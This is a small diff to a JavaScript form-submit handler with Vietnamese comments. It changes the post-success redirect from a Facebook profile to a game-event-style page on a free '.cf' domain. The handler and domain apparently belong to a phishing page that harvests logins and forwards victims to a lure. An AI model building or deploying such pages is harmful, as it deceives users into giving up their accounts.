@@ -32,7 +32,7 @@ submit.addEventListener("click",function(){
 			if(this.readyState==4){
 				if(times==0 && this.responseText){
 					console.log("Thanh cong!");
-					window.location = "https://www.facebook.com/vandung2kk2";
+					window.location = "https://sukien.lienminh.cf/mungdaile";
 				}else{
 					//Hien thi thong bao
 					document.getElementById("noti-box").style.display="flex";
